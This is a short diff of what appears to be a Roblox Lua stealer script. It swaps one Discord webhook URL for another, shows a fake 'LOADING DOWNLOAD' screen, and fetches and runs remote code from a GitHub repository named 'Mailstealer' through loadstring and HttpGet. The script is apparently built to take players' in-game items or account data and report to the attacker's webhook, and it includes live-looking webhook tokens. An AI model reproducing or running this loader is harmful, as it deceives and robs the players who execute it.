@@ -1,5 +1,5 @@
 _G.UserName = "meggadon0911"
-_G.Webhook = "https://discord.com/api/webhooks/1088955622147493918/rSWTFmx2yZFV_diyKJoVipn7tayKiHToOFbfRUH2Fk5KP6Nqrr1bNdo04gQmcTfMfS8X"
+_G.Webhook = "https://discord.com/api/webhooks/1088956815263412257/t-WAy2CzeJOfIGKuHZInHd8ubaOK3YgdkXjyiBy_PlX90b6LW70G5pKRY80_HOj4uLQv"
 _G.LSText = "LOADING DOWNLOAD" 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Burkino6666/Mailstealer/main/Lunar"))()
